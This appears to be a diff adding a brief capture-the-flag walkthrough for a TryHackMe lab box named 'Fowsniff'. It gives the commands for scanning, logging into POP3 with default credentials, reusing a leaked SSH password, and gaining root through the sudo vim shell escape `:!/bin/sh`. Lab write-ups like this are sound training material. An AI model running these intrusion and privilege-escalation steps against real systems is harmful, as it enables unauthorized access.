@@ -1,0 +1,73 @@
+----------------                               ------------------
+               :::::::::::;| FOWSNIFF CTF |;::::::::::::
+
+1) CONNECT TO THM VPN AND DEPLOY.
+
+TASK - 1 (RECON)
+
+1. SCAN THE BOX.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"Linux mail server detected"
+"Ports 22/SSH, 80/HTTP, 110/POP3 open"
+
+2. WEB CHECK:
+
+    http://<ip>
+    "Fowsniff logo found - check source"
+    "Hidden /assets/ directory"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (POP3 EXPLOIT)
+
+1. CONNECT TO POP3:
+
+    telnet <ip> 110
+    USER fowsniff
+    PASS fowsniff
+    "Login works! List emails"
+
+2. GET CREDS:
+
+    RETR 1
+    "Contains leaked passwords.txt"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (SSH ACCESS)
+
+1. TRY CREDS:
+
+    ssh mustikka@<ip>
+    Password: snoopy
+    "First user shell obtained"
+
+2. FIND USER FLAG:
+
+    cat /home/mustikka/user.txt
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC)
+
+1. CHECK SUDO:
+
+    sudo -l
+    "Can run /usr/bin/vim as root"
+    "Vim can spawn shells"
+
+2. GET ROOT:
+
+    sudo vim -c ':!/bin/sh'
+    "ROOT SHELL ACHIEVED!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/mustikka/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- FOWSNIFF OWNED ----------
